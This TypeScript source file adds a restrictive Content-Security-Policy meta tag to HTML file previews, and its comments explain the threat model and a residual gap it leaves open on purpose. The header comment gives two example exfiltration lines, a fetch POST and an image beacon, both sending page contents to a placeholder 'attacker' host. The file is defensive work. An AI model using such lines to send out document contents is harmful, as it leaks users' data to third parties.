// SEC-9 — a policy for the HTML file preview.
//
// The preview is a `srcdoc` iframe with `sandbox="allow-scripts"`. The sandbox
// already denies it the app's origin (see the comment at the `<iframe>` in
// `components/FileEditor.tsx`), but a `srcdoc` frame *inherits the embedder's
// CSP*, and the app's own policy is `connect-src 'self' … https: http: ws:
// wss:`. So the previewed page — routinely written by an agent, opened by a
// user who only wanted to look at it — could `fetch('https://attacker/', {
// method: 'POST', body: document.documentElement.outerHTML })` and the frame's
// inherited policy would allow it.
//
// CSP composes by intersection: a second policy can only ever remove
// capability, never grant it. Injecting one into the previewed document
// therefore tightens the frame and cannot loosen the app.
//
// What this takes away: `connect-src` (fetch / XHR / WebSocket / sendBeacon /
// EventSource) and `form-action`, the two ways a page hands a document to a
// server it chose. Plus `object-src` and `base-uri`, which are how a page
// re-points the *rest* of its own loads.
//
// What it leaves alone: everything that makes a page render — inline and
// remote script, style, font, image, media, nested frames. A preview that had
// to reach the network to render was already broken here (the frame has an
// opaque origin, so every request is cross-origin and uncredentialed); a
// preview that only wants to look right still works.
//
// Residual, and deliberate: an image-shaped beacon
// (`new Image().src = 'https://attacker/?d=' + …`) still gets out. Closing
// that means `img-src 'self' data:`, which breaks every preview of a page
// carrying a remote image — the common case, and by a wide margin. Narrowing
// further is a product call about what "preview" means, not something to do
// silently here.

const PREVIEW_CSP = [
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  "object-src 'none'",
].join('; ');

const META_TAG = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;

/** The policy string itself, so tests and callers can assert on it. */
export const HTML_PREVIEW_CSP = PREVIEW_CSP;

/**
 * Return `html` with the preview policy as the first thing inside `<head>`.
 *
 * Placement matters twice over: a `<meta http-equiv>` policy governs only the
 * loads the parser has not started yet, so it has to come before the
 * document's own `<script>`/`<link>`; and it must never land *before* a
 * `<!doctype>`, which would drop the preview into quirks mode and silently
 * change the layout the user is trying to look at.
 */
export function withHtmlPreviewCsp(html: string): string {
  if (!html) return META_TAG;

  const headOpen = /<head\b[^>]*>/i.exec(html);
  if (headOpen) {
    const at = headOpen.index + headOpen[0].length;
    return html.slice(0, at) + META_TAG + html.slice(at);
  }

  // `<html>` but no `<head>`: give it one. The parser would synthesise a head
  // anyway, but an explicit one keeps the meta ahead of any `<body>` content.
  const htmlOpen = /<html\b[^>]*>/i.exec(html);
  if (htmlOpen) {
    const at = htmlOpen.index + htmlOpen[0].length;
    return `${html.slice(0, at)}<head>${META_TAG}</head>${html.slice(at)}`;
  }

  // A bare fragment that still declares a doctype: stay behind it.
  const doctype = /^\s*<!doctype\b[^>]*>/i.exec(html);
  if (doctype) {
    return html.slice(0, doctype[0].length) + META_TAG + html.slice(doctype[0].length);
  }

  return META_TAG + html;
}
